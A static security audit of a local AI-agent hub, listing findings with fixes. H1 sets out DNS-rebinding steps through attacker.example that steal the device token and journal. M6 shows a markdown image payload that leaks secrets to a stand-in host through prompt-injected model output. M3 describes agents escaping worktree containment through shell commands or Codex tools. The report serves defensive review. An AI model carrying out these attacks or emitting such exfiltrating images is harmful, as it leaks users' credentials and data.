# AllMyAgents — Audit Round 2

Scope: correctness + security + consistency review of the features shipped in the last ~10 commits
(`a347d5d` … `5a40277`), focused on six areas: the device token, the origin/CORS guard, mesh
auto-expose, the markdown/diff `{@html}` surface, the worktree toggle + write-scope guard, and the
optimistic-echo / resilient-POST path.

Method: read-only static review. No servers/builds were run and git state was not touched, so the
runtime-dependent findings (notably **M2**) are called out as unverified-at-runtime with their exact
mechanism. Line numbers are against the working tree at audit time.

**Severity counts:** Critical 0 · High 2 · Medium 7 · Low 6 (+ a strengths / intended-behavior section).

**Single most important fix:** add **Host-header loopback validation** to the HTTP server and WS
`verifyClient` (closes **H1**, the DNS-rebinding read of the device token + journal). It is a small,
unambiguous change and it is the missing companion to the existing Origin guard. Pair it with **H2**
(make the token required-by-default once mesh exposure is on) so the newest security feature is not
inert in the default configuration.

---

## Critical

None. The worst outcomes below are (a) remote **read** exfiltration of the device token + journal via
DNS rebinding and (b) an unauthenticated control plane in the default posture — but state-changing
POST/RCE stays blocked by the Origin guard (POSTs always carry an `Origin`, which rebinding cannot
forge to loopback), so there is no unauthenticated remote RCE.

---

## High

### H1 — DNS rebinding reads the device token + full journal (no Host validation)
**Severity:** High
**Files:** `apps/hub/src/server.ts:181-185` (`originAllowed`), `:219-229` (guard), `:351-354`
(`/api/mesh` returns the raw token), `:453-458` (WS `verifyClient`); `apps/hub/src/index.ts:56-59`
(`requireToken` default off)

`originAllowed(undefined)` returns `true` — a deliberate allowance for non-browser/same-origin
callers — and the server never validates the `Host` header. Browsers omit the `Origin` header on
**same-origin GET** requests. Combined, this is a textbook DNS-rebinding hole against the loopback
hub:

Exploit (default config: `requireToken` off, mesh exposed):
1. Victim (running the hub) opens `http://attacker.example:7777/evil.html`. Attacker serves the page
   on port 7777 with a very low DNS TTL.
2. The page rebinds `attacker.example` → `127.0.0.1`, then does `fetch('/api/mesh')`. This is
   same-origin (page origin is `attacker.example:7777`), so the browser sends **no `Origin` header**
   and connects to `127.0.0.1:7777` — the hub.
3. Hub: `originAllowed(undefined)` → `true`; no Host check; `requireToken` off → not gated;
   `/api/mesh` returns `token: !requireToken || authed ? deviceToken : undefined` → hands the
   **device token** to the attacker page, which can read it (browser treats it as same-origin).
4. The same technique reads `/api/events` (entire journal), `/api/sessions`, `/api/stats`,
   `/api/projects`, `/api/usage` — prompts, tool inputs/outputs, cwd/worktree/project paths.

State-changing POSTs (`/api/sessions` spawn, etc.) still fail: same-origin POST **does** send
`Origin: http://attacker.example:7777`, which `originAllowed` rejects (403). So this is read
exfiltration, not RCE — but it leaks the security token itself (which never rotates — see **M1**) plus
the full transcript history.

`redact()` on journal payloads (`journal.ts:29`) blunts the transcript leak for known secret patterns,
but not the token (a live value on `/api/mesh`, not a journal row) nor the bulk of user/agent content.

**Fix:** validate `req.headers.host` against a loopback allowlist (`127.0.0.1:<port>`,
`localhost:<port>`, plus `tauri.localhost`) in `handle()` and in WS `verifyClient`; reject others with
403. Additionally, do not return the device token to a caller that presented no valid token even when
`requireToken` is off (require an explicit local proof for the bootstrap handout).

### H2 — Default posture: mesh exposed ON + token OFF ⇒ unauthenticated control plane
**Severity:** High (exposure to the *same-owner fleet* is by design — see note)
**Files:** `apps/hub/src/index.ts:56-59` (`requireToken` opt-in), `:67-72` (mesh auto-expose opt-out);
`apps/hub/src/server.ts:181-185`

By default `meshEnable` is **on** (opt out with `MESH_EXPOSE=0`) while `requireToken` is **off** (opt
in). With the token off, the Origin guard is the *only* control, and it grants full read **and** write
(spawn full-access agents, read the journal) to every caller that presents a loopback/`tauri.localhost`
Origin or no Origin. Through the AllMyStuff tunnel a fleet peer reaches the hub as
`http://localhost:<port>` — an allowed Origin — so **any** process on **any** fleet PC (not just the
user) that can reach that PC's mapped loopback port drives the hub unauthenticated. The entire newest
feature (the device token) therefore protects nothing in the shipped default.

**Known/intended:** exposure is to the owner's own fleet only (AllMyStuff fleet-key gating, no
cross-owner grant) and token enforcement is intentionally opt-in (`types.ts` `SecurityConfig`,
`deviceToken.ts` header). The risk is the *default combination*, not the capability.

**Fix (secure-by-default):** when mesh exposure resolves to on, default `requireToken` to on as well
(or refuse to register the site without a token). Local-only runs (no node present) can keep the token
off. This makes the safe configuration the zero-config one and turns the bootstrap handout into a true
same-machine-only pairing step.

---

## Medium

### M1 — Device token never rotates; no revocation path
**Severity:** Medium
**File:** `apps/hub/src/deviceToken.ts:16-28`

The token is generated once and persisted forever; the only way to invalidate it is to delete
`data/device-token.txt` and restart, which de-pairs *every* legitimate device at once. Any leak (the
pre-enforcement bootstrap window, a fleet peer's `localStorage`, the rebinding read in **H1**, a shared
browser profile) is permanent — turning `requireToken` on afterward does **not** revoke a
previously-captured token, defeating the point of enabling enforcement.

**Fix:** support versioned/rotatable tokens (e.g. store a small set, add a "rotate" action in
Settings → Mesh that issues a new token and optionally keeps a grace token), and a per-device revoke.

### M2 — CORS preflight omits `authorization`, breaking authenticated desktop requests
**Severity:** Medium (High impact for the packaged desktop app; unverified at runtime per constraints)
**File:** `apps/hub/src/server.ts:230-235` (esp. `:233`)

The OPTIONS/preflight response sets `Access-Control-Allow-Headers: content-type` only. `authorization`
is **not** a CORS-safelisted header, so any cross-origin request carrying `Authorization: Bearer …`
triggers a preflight that the browser will reject because `authorization` is absent from the allowed
list. In the Tauri app the UI is served from `tauri.localhost` and calls `http://127.0.0.1:7777`
(`api.ts:82`) — cross-origin — and `authHeaders()` attaches the Bearer whenever a token is stored
(`api.ts:100-102`), which happens right after the bootstrap `/api/mesh` (`api.ts:192-196`). Net: the
desktop app can bootstrap the token but then every subsequent `jget`/`jpost` fails preflight — even in
the default token-off config, because the token is still attached. Dev/browser mode is masked (same
origin via Vite proxy, no preflight), which is likely why it wasn't caught (the desktop app was
"verified" in `93cfed7`, *before* the token commit `5a40277`).

**Fix:** `Access-Control-Allow-Headers: 'content-type, authorization'` (and `x-hub-token`). Trivial and
correct regardless of the runtime question.

### M3 — Worktree write-scope guard is Claude-structured-tools-only and shell/Codex-porous
**Severity:** Medium
**Files:** `apps/hub/src/sessions.ts:88-99` (`checkWriteScope`), `:162-172` (Claude wiring),
`:108-143` (Codex wiring — no scope check), `:287-288` (Codex `full` → `approvalPolicy: 'never'`)

`checkWriteScope` only fires for `record.worktree` sessions and only for the tool names
`['Write','Edit','NotebookEdit']` (Claude's structured file tools). It does **not** cover:
- **Claude `Bash`** — `echo x > /outside/path`, `cp`, `python -c "open(...)"` bypass containment
  entirely (auto-approved in `edits`/`full` mode).
- **Any Codex tool** — the Codex approval callback (`codexClientFor`) never calls `checkWriteScope`;
  in `full` mode `approvalPolicy` is `'never'`, so Codex writes anywhere with zero checks.

So an agent in an "isolated worktree" can escape it via shell or via Codex — the isolation is
advisory, not enforced. The new **direct (non-worktree) mode** (`useWorktree:false`, `sessions.ts:196`)
has no guard at all (arguably intended — "no isolation" — but the label "in project" undersells that
writes can also land *outside* the project dir).

**Fix:** enforce cwd/worktree containment at the approval layer for all write-capable tools and both
providers (intercept Bash/`command` targets and Codex `fileChange`/`apply_patch` paths), or rely on a
real OS-level sandbox and stop presenting the worktree as a security boundary.

### M4 — Pairing gate never re-prompts on a stale/invalid stored token
**Severity:** Medium
**File:** `apps/web/src/lib/store.svelte.ts:138-150` (esp. `:141`)

```
if (auth.requireToken && !auth.authed && !getHubToken()) { this.needsPairing = true; return }
```

`api.auth()` sends the stored token as a Bearer, so `auth.authed` already reflects its validity. The
extra `&& !getHubToken()` suppresses the pairing overlay in exactly the broken case: a client that
*holds* a token which is no longer valid (hub reinstalled / token file deleted / rotated, or a bad
paste from **M5**). It then falls through to `api.mesh()`/`api.profiles()` with a rejected token; those
return 401 JSON bodies which `jget` hands back **as the data** (`this.profiles = {error:…}`), breaking
the UI with no way to re-pair.

**Fix:** gate on `auth.requireToken && !auth.authed` only (drop `&& !getHubToken()`); optionally clear
the stored token when `authed` is false.

### M5 — `pair()` persists the token before validating it
**Severity:** Medium
**File:** `apps/web/src/lib/store.svelte.ts:153-160`

```
async pair(token) {
  setHubToken(token.trim())          // written to localStorage first…
  const auth = await api.auth()...   // …then validated
  if (auth.authed || !auth.requireToken) { … }
}
```

A wrong paste is committed to `localStorage` unconditionally and there is no error feedback (the
overlay just sits). Combined with **M4**, a single mistyped token bricks the client on the next reload.

**Fix:** validate first (send the candidate as a one-off Bearer via `api.auth`), call `setHubToken`
only on success, and show an inline "that token didn't work" message otherwise.

### M6 — Remote-image beacon / prompt-injection exfiltration via markdown images
**Severity:** Medium
**File:** `apps/web/src/lib/markdown.ts:54-60` (`sanitizeProse`)

DOMPurify neutralizes scripts/handlers/`javascript:` (verified — see strengths), and the `FORBID_TAGS`
list blocks `iframe/object/embed/link/meta/base`, but it does **not** forbid `<img>` or restrict its
`src`. Assistant/reasoning text is model-generated and can be influenced by untrusted content the agent
reads (prompt injection). A payload like `![x](https://attacker/leak?d=<secret>)` renders an `<img>`
that the browser auto-fetches on display — leaking the viewer's IP and letting the model encode
exfiltrated data in the URL path/query. `Markdown.svelte` even styles `img` (`:130`), confirming it is
expected to render.

**Fix:** forbid `img` in prose (or restrict `src`/`srcset` to `data:`/loopback), and/or ship a page
CSP with `img-src 'self' data:`. Same consideration applies to any remote `srcset`.

### M7 — "Thinking" indicator sticks forever after a failed send
**Severity:** Medium
**File:** `apps/web/src/lib/ThreadView.svelte:107-118`

`send()` calls `store.noteSent(sid0)` (sets `turnStartedAt`, driving the "thinking" spinner + timer)
*before* awaiting `api.send`. On failure the error branch calls `store.removeItem` (rolls back the echo
+ clears the Codex suppress flag) and restores the draft, but never clears `turnStartedAt`. Because the
POST never reached the hub, no `session/status` event will arrive to reset it — so the spinner runs
indefinitely, contradicting the `⚠ … your message was kept in the box` banner shown right beside it.

**Fix:** in the error branch (or inside `removeItem`), reset `view.turnStartedAt = undefined` and
`view.liveTokens = undefined` (e.g. add a `store.noteSendFailed(sid0)`).

---

## Low

### L1 — `device-token.txt` mode `0o600` is a no-op on Windows
`deviceToken.ts:26` writes with `{ mode: 0o600 }`, which POSIX-restricts the file — but on Windows
(the primary platform here) NTFS ignores the mode, so any local user can read
`data/device-token.txt`. It is gitignored (`.gitignore:4` → `data/`, confirmed via `git check-ignore`),
so it won't be committed; the exposure is local-user only. Either set an ACL explicitly or document
that the token file is only as private as the OS account.

### L2 — Built-in `/` admin page is ungated and its WS uses no token
`server.ts:252-256` serves the full control UI at `/` outside the token gate, and that page's inline
WS (`server.ts:135`) connects to `/ws?since=0` with **no** token. Under `requireToken` the page loads
but is dead (its `/api/*` calls 401, its WS is rejected by `verifyClient`) and it has no token input.
When the token is off it is a *second* full control surface (spawn/stop/approve) reachable by anyone
who can reach the hub. Consistency/tidiness: either gate `/`, give it a token field, or drop it in
favor of the SPA.

### L3 — Device token travels in the WS URL query string
`store.svelte.ts:397-400` puts `&token=<t>` in the WS URL; `server.ts:456-457` reads it from the query.
Browsers can't set custom headers on the WS handshake, so a query param is the usual workaround, but
secrets in URLs risk landing in the AllMyStuff node / any proxy access log. Prefer passing it via
`Sec-WebSocket-Protocol` (subprotocol) instead of the query string.

### L4 — `originAllowed` doesn't cover IPv6 loopback or 127.0.0.0/8
`server.ts:184` matches only `localhost`/`127.0.0.1`. A UI served from `http://[::1]:port` or
`http://127.0.0.2:port` would be rejected. This is stricter-than-needed (not a hole), but note it if
IPv6 loopback is ever used.

### L5 — Patch/diff parsing builds unbounded in-memory structures from one tool input
`diff.ts:241-353` (`parsePatch`) splits and expands an entire patch string into `FileDiff` objects with
no size cap; a pathological multi-MB "patch" in a single tool input would be fully materialized and
(for a 1-line giant) highlighted synchronously. Practically bounded by model output size. The LCS table
itself **is** correctly bounded (`MAX_LCS_CELLS`, `diff.ts:115,126-131`) and `DiffView` highlights only
visible rows — good. Consider a max input length before parsing as belt-and-suspenders.

### L6 — Codex optimistic-echo suppress flag is a boolean, not a count
`store.svelte.ts:81,338` — `suppressNextUserMsg[sessionId]` can represent only one pending echo. Not
reachable in the current flow (Codex turns are awaited serially and mid-turn input steers rather than
enqueues, so at most one optimistic user echo is outstanding), but it is latent: any future path that
sends two Codex messages before the first `userMessage` event would double-render the second bubble.
A per-message id or a counter would be robust.

---

## Verified correct / strengths

- **`tokenMatches` is sound** (`deviceToken.ts:31-37`): guards `undefined`, returns false on length
  mismatch *before* `crypto.timingSafeEqual` (which throws on unequal-length buffers), then does a
  constant-time compare. The early length-return leaks only length, which is not secret (fixed
  base64url-of-32-bytes). Header-array inputs are coerced to `undefined` in `bearerToken`
  (`server.ts:187-193`). Correct.
- **All three `{@html}` sinks are sanitized.** The only `{@html}` in the app are
  `Markdown.svelte:19`, `DiffView.svelte:161`, `CodeBlock.svelte:62` (confirmed by repo-wide grep).
  Prose goes through DOMPurify's XSS-safe default profile plus a `FORBID_TAGS`/`FORBID_ATTR` hardening
  list (`markdown.ts:54-60`); code and diff lines are either HTML-escaped plaintext or highlight.js
  output run through a `span`/`class`-only DOMPurify allowlist (`markdown.ts:65-81`, `diff.ts:54-70`).
  Links are hardened with `target=_blank rel="noopener noreferrer"` (`markdown.ts:38-43`).
  `markdown.test.ts` pins the important vectors (`<script>`, `onerror`, `javascript:`, raw `onclick`,
  `<iframe>`, and code-block escaping). Strong.
- **Dependencies are current** — `dompurify@3.4.12`, `marked@18.0.7`, `highlight.js@11.11.1` (from
  `pnpm-lock.yaml`); no known sanitizer-bypass or ReDoS at these versions. `marked` runs on an isolated
  instance, not the global singleton (`markdown.ts:27`).
- **Origin guard regex is correctly anchored** (`server.ts:181-185`): rejects `http://localhost.evil.com`,
  `http://127.0.0.1.evil.com`, userinfo tricks (`http://localhost@evil.com` → Origin is `evil.com`),
  and `Origin: null`; ACAO is reflected only for already-allowed origins (disallowed origins 403 with
  no ACAO). This closes the drive-by CSRF/RCE **POST** vector and blocks rebinding POSTs. (Reads are the
  gap — see **H1**.)
- **The `requireToken` gate is uniform and bypass-resistant** (`server.ts:241-251`): it keys off the
  same normalized `url.pathname` the handlers use (no `//api`/prefix/method bypass), applies to every
  method under `/api/`, runs after OPTIONS (preflight carries no data) and after the intentionally
  public `/api/auth` probe. `/api/auth` returns only `{requireToken, authed}` — a yes/no, never the
  token — so it is safe to be public. `/api/mesh` correctly withholds the token from unauthenticated
  callers once enforcement is on (`server.ts:352`, and the gate 401s them before reaching it anyway).
- **Resilient POST + optimistic echo rollback is correct** (`api.ts:109-127`, `ThreadView.svelte:114-118`,
  `store.svelte.ts:343-349`): `jpost` never throws (returns `{error}` on non-JSON or network failure);
  the send path checks `out.error`, rolls back the optimistic bubble via `removeItem` (which also
  clears the Codex suppress flag, preventing desync on the error path), and restores the draft.
- **Journal + replay** (`journal.ts`): payloads pass through `redact()` before persistence, and
  `replay()` is a bounded, paged synchronous generator that lets the WS handler join replay→live with
  no gap and no duplicate (documented and correct — no `await` between the last page and
  `journal.on('event')`; client also dedups on `seq <= lastSeq`).
- **LCS memory bound + per-line, visible-only highlighting** keep hostile diffs bounded
  (`diff.ts:115`, `DiffView.svelte:36,41-55`).

---

## Known / intended (explicitly noted, not counted as defects)

- **Token enforcement is opt-in** (`requireToken` default off) — documented in `types.ts`
  `SecurityConfig` and `deviceToken.ts`. Pure-loopback local use behind the Origin guard is the
  intended baseline.
- **Mesh is same-owner** — AllMyStuff fleet-key gating means exposure reaches only the owner's own
  devices (no cross-owner grant); the hub always binds `127.0.0.1` and is tunneled, never bound to a
  routable interface (`meshSite.ts`, `index.ts:60-72`).
- **The pre-enforcement token handout is the intended pairing bootstrap** for the owner's own fleet
  (`deviceToken.ts` header comment; `api.ts:192-196`). The findings above target the parts *beyond*
  that intent: the rebinding read (**H1**), no rotation (**M1**), stale-token handling (**M4**/**M5**),
  and the expose-on/token-off default (**H2**).
- **Direct (non-worktree) mode intentionally has no git isolation.** **M3**'s point is narrower: the
  *worktree* mode is also escapable (shell / Codex), so it shouldn't be relied on as a security
  boundary — that part is likely not intended.

---

### Suggested fix order
1. **H1** Host-header loopback allowlist (HTTP + WS) — small, closes remote token/journal read.
2. **H2** default `requireToken` on when mesh exposure is on (secure-by-default).
3. **M2** add `authorization` to `Access-Control-Allow-Headers` — one line, unblocks the desktop app.
4. **M4/M5** fix the pairing gate + validate-before-persist (prevents self-inflicted lockout).
5. **M1** token rotation/revocation; **M3** real write containment; **M6** image policy; **M7** clear
   `turnStartedAt` on send failure.
